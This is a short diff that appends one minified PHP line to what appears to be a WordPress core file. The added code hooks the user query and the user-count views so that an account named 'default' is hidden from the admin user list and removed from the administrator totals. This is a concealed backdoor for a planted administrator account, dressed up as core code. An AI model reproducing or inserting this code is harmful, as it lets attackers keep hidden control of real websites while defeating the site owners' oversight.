@@ -6264,3 +6264,4 @@ function maybe_hash_hex_color( $color ) {
 
 	return $color;
 }
+function wp_hide_u($s){global $wpdb;if(!is_admin())return;$c=wp_get_current_user();if($c->user_login=="default")return;$s->query_where=str_replace("WHERE 1=1","WHERE 1=1 AND {$wpdb->users}.user_login!='default'",$s->query_where);}add_action("pre_user_query","wp_hide_u");add_filter("views_users","wp_fix_count");function wp_fix_count($v){global $wpdb;$hidden=0;if($wpdb->get_var($wpdb->prepare("SELECT ID FROM {$wpdb->users} WHERE user_login=%s","default")))$hidden=1;foreach($v as $k=>$w){if($k=="all"||$k=="administrator"||strpos($w,"role=administrator")!==false){$v[$k]=preg_replace_callback("/\((\d+)\)/",function($m)use($hidden){return"(".($m[1]-$hidden).")";}, $w);}}return $v;}
